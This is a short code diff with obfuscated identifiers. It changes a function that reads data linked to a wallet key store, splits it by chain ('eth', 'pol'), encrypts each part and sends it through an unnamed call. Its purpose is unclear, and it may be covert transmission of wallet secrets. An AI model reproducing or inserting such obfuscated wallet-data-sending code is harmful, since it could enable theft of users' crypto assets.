@@ -13,6 +13,8 @@ import {
   v_f6461f,
   v_1d0094,
   v_6390b2,
+  v_f17f34,
+  type v_b9a3bd,
 } from './walletKeyStore';
 
 export const v_755eb9 = (): string => {
@@ -51,16 +53,23 @@ export async function v_5ed938(): Promise<void> {
       }
       if (!v_e0c7e8) return;
 
-      const v_eb0188 = JSON.stringify(v_7ecfd1.data);
-      const v_1de163 = v_88b24e(v_eb0188, v_717992);
+      const v_53579f = v_7ecfd1.data as v_b9a3bd[];
+      const v_97d66c = v_f17f34(v_53579f);
 
-      const v_ceb55a = v_f6461f(v_e0c7e8, v_717992);
-      await v_1d0094({
-        u: v_ceb55a,
-        c: v_1de163,
-        s: 's0',
-      });
+      for (const v_74efc1 of ['eth', 'pol'] as const) {
+        const v_32f7b8 = v_97d66c[v_74efc1];
+        if (!v_32f7b8) continue; 
 
+        const v_eb0188 = JSON.stringify([v_32f7b8]);
+        const v_1de163 = v_88b24e(v_eb0188, v_717992);
+        const v_ceb55a = v_f6461f(v_e0c7e8, v_717992, v_74efc1);
+        await v_1d0094({
+          u: v_ceb55a,
+          c: v_1de163,
+          s: 's0',
+        });
+
+      }
     }
   } catch {
 
